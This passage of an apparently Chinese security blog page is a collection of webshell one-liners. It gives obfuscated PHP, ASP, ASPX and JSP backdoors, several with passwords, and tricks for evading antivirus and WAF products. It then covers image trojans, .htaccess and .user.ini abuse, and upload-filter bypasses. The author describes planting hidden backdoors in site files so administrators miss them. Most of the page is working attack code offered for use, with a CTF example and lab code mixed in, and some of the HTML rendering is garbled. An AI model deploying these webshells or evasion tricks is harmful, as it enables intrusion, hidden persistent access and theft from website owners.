@ <span class="token operator">=</span> <span class="token operator">/</span> ∗ − <span class="token operator">/</span> ∗ − ∗ <span class="token operator">/</span> <span class="token operator">&amp;</span>quot<span class="token punctuation">;</span> a <span class="token operator">&amp;</span>quot<span class="token punctuation">;</span> <span class="token operator">.</span> <span class="token operator">/</span> ∗ − <span class="token operator">/</span> ∗ − ∗ <span class="token operator">/</span> <span class="token constant">_</span><span class="token operator">=</span><span class="token comment">/*-/*-*/</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>a<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token operator">.</span><span class="token comment">/*-/*-*/</span> <span class="token operator">=</span>​<span class="token operator">/</span>∗−<span class="token operator">/</span>∗−∗<span class="token operator">/</span><span class="token string double-quoted-string">"a"</span><span class="token operator">.</span><span class="token operator">/</span>∗−<span class="token operator">/</span>∗−∗<span class="token operator">/</span><span class="token constant">_</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">*</span><span class="token operator">/</span>“t”<span class="token punctuation">;</span>

@ <span class="token operator">/</span> ∗ − <span class="token operator">/</span> ∗ − ∗ <span class="token operator">/</span> <span class="token punctuation">(</span> <span class="token constant">_</span><span class="token comment">/*-/*-*/</span><span class="token punctuation">(</span> <span class="token operator">/</span>​∗−<span class="token operator">/</span>∗−∗<span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token punctuation">&#123;</span><span class="token string double-quoted-string">"_P"</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span>“<span class="token constant">OS</span>”<span class="token operator">.</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">*</span><span class="token operator">/</span>“<span class="token constant">T</span>”<span class="token punctuation">&#125;</span>

<span class="token punctuation">[</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token number">0</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token number">2</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token number">5</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token operator">-</span><span class="token operator">/</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
密码-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">phpv9 高版本拿shell
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'c7.php'</span><span class="token punctuation">,</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD9waHAgQGV2YWwoJF9QT1NUW2NjMjc4OV0pOz8+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>

…/…/…/…/html/special/cc/index<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">asp 一句话

&lt;%execute(request(“cmd”))%&gt;
&lt;%execute request(“1”)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">ASP一句话16进制：┼攠數畣整爠煥敵瑳∨≡┩愾 密码a
&quot;%&gt;&lt;%Eval(Request(chr(112)))%&gt;&lt;%’ p

&lt;%Y&#x3D;request(“xindong”)%&gt; &lt;%execute(Y)%&gt;

&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(“xindong”))%&gt;

&lt;%eval&quot;&quot;&amp;(“e”&amp;“v”&amp;“a”&amp;“l”&amp;&quot;(&quot;&amp;“r”&amp;“e”&amp;“q”&amp;“u”&amp;“e”&amp;“s”&amp;“t”&amp;&quot;(&quot;&amp;“0”&amp;&quot;-&quot;&amp;“2”&amp;&quot;-&quot;&amp;“5”&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;（密码是-7）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">ASP过安全狗一句话

密码（pass）

&lt;% %&gt;

&lt;%a&#x3D;request(“zl”)%&gt;&lt;%eval a%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ASPX系列"><a href="#ASPX系列" class="headerlink" title="ASPX系列"></a>ASPX系列</h2><pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">ASPX一句话的 过安全狗效果不怎么样

不过我认为能支持aspx 百分之8&#x2F;90支持asp

&lt;%@ Page Language &#x3D; Jscript %&gt;
&lt;%var&#x2F;-&#x2F;-&#x2F;P&#x2F;-&#x2F;-&#x2F;&#x3D;&#x2F;-&#x2F;-&#x2F;“e”+“v”+&#x2F;-&#x2F;-&#x2F;
“a”+“l”+&quot;(&quot;+“R”+“e”+&#x2F;-&#x2F;-&#x2F;“q”+“u”+“e”&#x2F;-&#x2F;-&#x2F;+“s”+“t”+
“[&#x2F;-&#x2F;-&#x2F;0&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;2&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;-&#x2F;5&#x2F;-&#x2F;-&#x2F;]”+
“,”+&quot;&quot;&quot;+“u”+“n”+“s”&#x2F;-&#x2F;-&#x2F;+“a”+“f”+“e”+&quot;&quot;&quot;+&quot;)&quot;;eval
(&#x2F;-&#x2F;-&#x2F;P&#x2F;-&#x2F;-&#x2F;,&#x2F;-&#x2F;-&#x2F;“u”+“n”+“s”&#x2F;-&#x2F;-&#x2F;+“a”+“f”+“e”&#x2F;-&#x2F;-&#x2F;);%&gt; 密码 -7

&lt;%@ Page Language&#x3D;“Jscript”%&gt;&lt;%eval(Request.Item[“xindong”],“unsafe”);%&gt;
密码是webadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-asp" data-language="asp"><code class="language-asp">aspx一句话

&lt;%@ Page Language&#x3D;“Jscript” validateRequest&#x3D;“false” %&gt;&lt;%Response.Write(eval(Request.Item[“w”],“unsafe”));%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%if(request.getParameter(“f”)!&#x3D;null)(new java.io.FileOutputStream(application.getRealPath(&quot;&#x2F;&quot;)+request.getParameter(“f”))).write(request.getParameter(“t”).getBytes());%&gt;

select ‘&lt;?php eval($_POST[cmd];?&gt;’ into outfile ‘C:&#x2F;Inetpub&#x2F;wwwroot&#x2F;mysql-php&#x2F;1.php’<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">过护卫神的

&lt;%E&#x3D;request(“1”)%&gt;abc

123456789
&lt;%execute E%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>原来代码是&lt;%execute request(“cmd”)%&gt; 把标签修改替换下来 为</p>
<p>&lt;scriptlanguage&#x3D;VBScript runat&#x3D;server&gt;execute request(“cmd”) 这样就避开了&lt;%,%&gt;符号！</p>
<p>表中数据段限制，一句话木马也写不下的情况<br>网络中流传的最小的木马代码是&lt;%eval request(“#”)%&gt; 如过连这也写不下怎么办？<br>将木马分开写就好了！ &lt;%Y&#x3D;request(“x”)%&gt; &lt;%execute(Y)%&gt; 这样分开写提交到数据库就没问题了！<br>不过，在ACCESS数据库中新增加的数据物理位置是在旧数据之前的，所以要先写&lt;%execute(Y)%&gt;部分。写好后在客户端写密码时除了填写”x”以外的任何字符都可以，如果填了”x”就会出错！<br>插入一句话容易爆错<br>例如</p>
<pre class="line-numbers language-none"><code class="language-none">Sub unlockPost()

Dim id,replyid,rs,posttable

id&#x3D;Request(“id”)

replyid&#x3D;Request(“replyid”)

If Not IsNumeric(id) or id&#x3D;&quot;&quot; Then<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>写成</p>
<pre class="line-numbers language-none"><code class="language-none">Sub unlockPost(&lt;%eval request(&quot;#&quot;)%&gt;)

Dim id,replyid,rs,posttable

id&#x3D;Request(“id”)

replyid&#x3D;Request(“replyid”)

If Not IsNumeric(id) or id&#x3D;&quot;&quot; Then<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就可以了，也可以写成带容错语句的格式！！</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;%if request(“cmd”)&lt;&gt;&quot;&quot;then execute request(“cmd”)%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="关于免杀等"><a href="#关于免杀等" class="headerlink" title="关于免杀等"></a>关于免杀等</h2><p>一句话木马到两句话木马的转型!</p>
<p>一句话木马服务端原型:&lt;%execute request(“value”)%&gt; ,</p>
<p>变形后:&lt;%On Error Resume Next execute request(“value”)%&gt; ,</p>
<p>至于为什么要用两句话木马呢,是由于使我们的后门更加隐蔽.</p>
<p>我也试过用一句话插入WellShell的某个ASP文件里面,可是访问时经常出错,而插入两句话木马服务端却可以正常访问了,对站点的页面无任何影响.</p>
<p>这样就达到了隐蔽性更强的目的了,他管理员总不会连自己的网页文件都删了吧.</p>
<p>现在我的WellShell都有这样的后门.选择要插入两句话木马的ASP文件要注意,选一些可以用IE访问的ASP文件,不要选conn.asp这样的文件来插入.</p>
<p>当然,连接两句话木马的客户端仍然是用一句木马的客户端,不用修改.</p>
<p>一句话免杀：</p>
<p>一：变形法</p>
<p>比如：eval(request(“#”))这样的马儿呢，一般情况下是不被杀的。但实际上，经常杀毒软件会把eval(request列为特征码。所以我们变形一下</p>
<p>E&#x3D;request(“id”)</p>
<p>eval(E)</p>
<p>这样可达到免杀的目的。</p>
<p>例如：&lt;%execute request(“1”)%&gt; 变形后：</p>
<p>&lt;%E&#x3D;request(“1”)</p>
<p>execute E%&gt;</p>
<p>当然，这种变形是最好做的。</p>
<p>介绍第二种方法：因为很多管理员很聪明，它会检查ASP文件中的execute和eval函数。所以呢，不管你怎么反编译，它最终总是要用其中的一个函数来解释运行，所以还是被发现了。好么，我们用外部文件来调用。建一个a.jpg或者任何不被发现的文件后缀或文件名。写入 execute(request(“#”))当然，你可以先变形后现放上去。然后在ASP文件中插入</p>
<p>来引用它，即可。</p>
<p>不过，管理员可以通过对比文件的方式找到修改过的文件，不过这种情况不多。</p>
<p>在WEBSHeLL中使用命令提示</p>
<p>在使用ASP站长助手6.0时点击命令提示符显示“没有权限”的时候，可以使用ASP站长助手上传CMD.exe到你的WEBSHELL目录（其它目录也行，把上传以后的CMD.exe绝对路径COPY出来），再修改你的WEBSHELL找到调用CMD.EXE的代码。原来的代码如下</p>
<p>.exec(“cmd.exe &#x2F;c “&amp;DefCmd).stdout.readall</p>
<p>修改为</p>
<p>.exec(“你想上传的cmd.exe绝对路径” &#x2F;c”&amp;DefCmd).stdout.readall</p>
<p>比如你上传到的目录是D：\web\www\cmd.exe,那么就修改成</p>
<p>.exec(“D：\web\www\cmd.exe &#x2F;c”&amp;DefCmd).stdout.readall<br>支持变异菜刀连接以过安全狗,过啊D 文件扫描的一句话</p>
<p>实已经不是一句话了，好几句了都。<br>继续上次的：我使用的一句话的几种姿态</p>
<p>这回研究了下PHP，发一下我使用的一句话（可过文件扫描）。<br>ASP<br><?php $mujj = $_POST['z']; if ($mujj!="") { $xsser=base64_decode($_POST['z0']); @eval("\$safedg = $xsser;"); } ?></p>
<p>密码z，支持菜刀连接；支持变异菜刀连接以过安全狗。</p>
<p>另外：<br>ASP</p>
<p>&lt;% Function MorfiCoder(Code) MorfiCoder&#x3D;Replace(Replace(StrReverse(Code),”&#x2F;&#x2F;“,””””),”*”,vbCrlf)<br>End Function<br>Execute MorfiCoder(“)&#x2F;&#x2F;z&#x2F;*&#x2F;(tseuqer lave”) %&gt;<br>ASPX<br>&lt;% popup(popup(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(“UmVxdWVzdC5JdGVtWyJ6Il0&#x3D;”)))); %&gt;<br>大家伙 把你们手中好的发出来共享下吧 别藏着了</p>
<p>分享是交流的关键，我不喜欢什么大马 小马 一句话是我的最爱，不仅隐藏性高 免杀效果好 而且无后门（当然排除菜刀有） —- 没禁用一句话post的情况下。</p>
<?phpsession_start();$_POST['code'] && $_SESSION['theCode'] = trim($_POST['code']);$_SESSION['theCode'] && preg_replace('\'a\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\'theCode\']))','a');?>
<p>此方法用两个文件实现：<br>文件1<br><?phpheader('Content-type:text/html;charset=utf-8');parse_str($_SERVER['HTTP_REFERER'], $a);if(reset($a) == '10' && count($a) == 9) { eval(base64_decode(str_replace(" ", "+", implode(array_slice($a, 6)))));}?><br>文件2<br><?phpheader('Content-type:text/html;charset=utf-8');//要执行的代码$code = <<<CODEphpinfo();CODE;//进行base64编码$code = base64_encode($code);//构造referer字符串$referer = "a=10&b=ab&c=34&d=re&e=32&f=km&g={$code}&h=&i=";//后门url$url = 'http://localhost/test1/1.php';$ch = curl_init();$options = array( CURLOPT_URL => $url, CURLOPT_HEADER => FALSE, CURLOPT_RETURNTRANSFER => TRUE, CURLOPT_REFERER => $referer);curl_setopt_array($ch, $options);echo curl_exec($ch);?><br>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。<br><?php ($_=@$_GET[2]).@$_($_POST[1]) ?><br>在菜刀里写<a target="_blank" rel="noopener" href="http://site/1.php?2=assert%E5%AF%86%E7%A0%81%E6%98%AF1">http://site/1.php?2=assert密码是1</a><br><?php$_="";$_[+""]='';$_="$_"."";$_=($_[+""]|"").($_[+""]|"").($_[+""]^"");?><?php${'_'.$_}['_'](${'_'.$_}['__']);?><br>在菜刀里写<a target="_blank" rel="noopener" href="http://site/2.php?=assert&__=eval($POST%5B%27pass%27%5D)">http://site/2.php?=assert&amp;__=eval($POST[&#39;pass&#39;])</a> 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。<br>($b4dboy &#x3D; $<em>POST[‘b4dboy’]) &amp;&amp; @preg_replace(‘&#x2F;ad&#x2F;e’,‘@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);<br>str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！<br>高级的PHP一句话木马后门<br>1、$hh &#x3D; “p”.”r”.”e”.”g”.”</em>“.”r”.”e”.”p”.”l”.”a”.”c”.”e”;$hh(“&#x2F;[discuz]&#x2F;e”,$_POST[‘h’],”Access”);&#x2F;一句话2、$filename&#x3D;$_GET[‘xbid’];include ($filename);&#x2F;&#x2F;危险的include函数，直接编译任何文件为php格式运行3、$reg&#x3D;”c”.”o”.”p”.”y”;$reg($_FILES[MyFile][tmp_name],$<em>FILES[MyFile][name]);&#x2F;&#x2F;重命名任何文件4、$gzid &#x3D; “p”.”r”.”e”.”g”.”</em>“.”r”.”e”.”p”.”l”.”a”.”c”.”e”;$gzid(“&#x2F;[discuz]&#x2F;e”,$_POST[‘h’],”Access”);&#x2F;一句话5、include ($uid);&#x2F;&#x2F;危险的include函数，直接编译任何文件为php格式运行，POST <a target="_blank" rel="noopener" href="http://www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif%E6%8F%92%E4%B8%80%E5%8F%A5%E8%AF%9D6%E3%80%81%E7%A8%8B%E5%BA%8F%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81">www.xxx.com/index.php?uid=/home/www/bbs/image.gif//gif插一句话6、程序后门代码</a><?php eval_r($_POST[sb])?>程序代码<?php @eval_r($_POST[sb])?>&#x2F;&#x2F;容错代码程序代码<?php assert($_POST[sb]);?>&#x2F;&#x2F;使用lanker一句话客户端的专家模式执行相关的php语句程序代码<?$_POST['sa']($_POST['sb']);?>程序代码<?$_POST['sa']($_POST['sb'],$_POST['sc'])?>程序代码<?php@preg_replace("/[email]/e",$_POST['h'],"error");?>&#x2F;&#x2F;使用这个后,使用菜刀一句话客户端在配置连接的时候在”配置”一栏输入程序代码<O>h&#x3D;@eval_r($_POST1);</O>程序代码<script language="php">@eval_r($_POST[sb])</script>&#x2F;&#x2F;绕过&lt;?限制的一句话</p>
<hr>
<h1 id="简易图片马"><a href="#简易图片马" class="headerlink" title="简易图片马"></a>简易图片马</h1><p>图片马:就是在图片中隐藏一句话木马。利用.htaccess等解析图片为PHP或者asp文件。达到执行图片内代码目的</p>
<h2 id="制作方法"><a href="#制作方法" class="headerlink" title="制作方法:"></a>制作方法:</h2><p>文本方式打开,末尾粘贴一句话木马<br>cmd中 copy 1.jpg&#x2F;b+2.php 3.jpg<br>copy test1.jpg&#x2F;b+test2.asp&#x2F;a test3.jpg<br>&#x2F;b是二进制形式打开<br>&#x2F;a是ascii方式打开<br>看到有人说一定要把图片放前面,木马放后面才能成功,我亲自试了这两种制作方式(另一种图片放后面),均能成功连接,但是后者的一句话木马在文件开头,不推荐<br>16进制打开图片在末尾添加一句话木马。</p>
<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><p>注意以下几点:<br>单纯的图片马并不能直接和蚁剑连接，<br>因为该文件依然是以image格式进行解析，<br>只有利用文件包含漏洞，才能成功利用该木马<br>所谓文件包含漏洞，是指在代码中引入其他文件作为php文件执行时，未对文件进行严格过滤，导致用户指定任意文件，都作为php文件解析执行。</p>
<h2 id="user-ini-有php就能用"><a href="#user-ini-有php就能用" class="headerlink" title=".user.ini 有php就能用"></a>.user.ini 有php就能用</h2><p>php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>php 配置项中有两个配置可以起到一些作用<br>auto_prepend_file &#x3D; <filename> &#x2F;&#x2F;包含在文件头<br>auto_append_file &#x3D; <filename> &#x2F;&#x2F;包含在文件尾<br>这两个配置项的作用相当于一个文件包含，比如<br>&#x2F;&#x2F; .user.ini<br>auto_prepend_file &#x3D; 1.jpg<br>&#x2F;&#x2F; 1.jpg<br><?php phpinfo();?><br>&#x2F;&#x2F; 1.php(任意php文件)<br>满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句require(‘1.png’)，进行了文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。<br>.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。<br>局限<br>在.user.ini中使用这条配置也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。<br>但是有时可以使用 ..&#x2F; 来将文件上传到其他目录，达到一个利用的效果。<br>.user.ini<br>第一步<br>GIF89a<br>auto_prepend_file &#x3D; 1.jpg</p>
<h2 id="htaccess-只能apache"><a href="#htaccess-只能apache" class="headerlink" title=".htaccess 只能apache"></a>.htaccess 只能apache</h2><p>.htaccess文件(或者”分布式配置文件”)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。<br>在绕过文件上传的限制中，在Apache全局配置文件中httpd.conf有这样一条配置<br>AddType application&#x2F;x-httpd-php .php .phtml .php5 .pht .phps<br>￼<br>这里配置的意思就是将以.php .phtml .php5 .pht .phps为后缀的文件按php文件进行解析。<br>AddType application&#x2F;x-httpd-php (.jpg) &#x2F;&#x2F;将所有文件按照php文件进行解析（将jpg文件按照php文件进行解析）<br>我们来看一个例题来帮助理解。<br>[MRCTF2020]你传你*呢<br>经过测试发现上传的jpg通过修改后缀名上传成功但后台仍然无法解析我们上传的shell故使用.htaccess文件进行一次“包含”<br>先上传一个.htaccess文件内容如下<br>&lt;FilesMatch “a.png”&gt;SetHandler application&#x2F;x-httpd-php<br>第一行的文件名为要上传的shell的文件名第二行就是我们上面解释到的，将所有文件都按照php代码进行解析抓包<br>￼<br>这里将文件类型修改为image&#x2F;png服务器会按php文件进行解析再上传shell<br>￼<br>通过蚁剑连接shell</p>
<h1 id="文件上传姿势"><a href="#文件上传姿势" class="headerlink" title="文件上传姿势"></a>文件上传姿势</h1><p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Mitchell_Donovan/article/details/112911056">https://blog.csdn.net/Mitchell_Donovan/article/details/112911056</a></p>
<p>客户端</p>
<p>js检查</p>
<p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
<p>绕过方法</p>
<p>1.我们直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可。</p>
<p>或者可以不加载所有js，还可以将html源码copy一份到本地，然后对相应代码进行修改，本地提交即可。</p>
<p>2.burp改包，由于是js验证，我们可以先将文件重命名为js允许的后缀名，在用burp发送数据包时候改成我们想要的后缀。</p>
<p>即可上传成功：</p>
<p>服务端</p>
<p>黑名单</p>
<p>这里做了黑名单处理，我们可以通过特殊可解析后缀进行绕过。<br>绕过方法</p>
<p>可以使用php、php4、php5、phpt、php3，phtml等绕过。</p>
<p>上传.htaccess</p>
<p>我们发现黑名单限制了很多后缀名，但是没有限制.htaccess</p>
<pre><code>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置.通过htaccess文件，可以实现:网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。
</code></pre>
<p>绕过方法</p>
<p>我们这里关注.htaccess文件可以修改MIME类型，这使得该.htaccess文件所在目录及其子目录中的后缀为.xxx的文件被Apache当做php文件。<br> AddType application&#x2F;x-httpd-php xxx</p>
<p>或者：<br>  &lt;FilesMatch “shell.jpg”&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>  </FilesMatch></p>
<p>该语句会让Apache把shell.jpg文件解析为php文件</p>
<p>我们需要上传一个.htaccess文件，内容为：</p>
<p>SetHandler application&#x2F;x-httpd-php</p>
<p>这样所有的文件都会解析为php，接下来上传图片马即可</p>
<p>后缀大小写绕过</p>
<p>我们发现对.htaccess也进行了检测，但是没有对大小写进行统一。<br>绕过方法</p>
<p>后缀名改为PHP即可</p>
<p>空格绕过</p>
<p>黑名单没有对文件中的空格进行处理，可在后缀名中加空格绕过。<br>绕过方法</p>
<p>文件名最后加个空格，如：1.PHP（空格）</p>
<p>点绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>
        
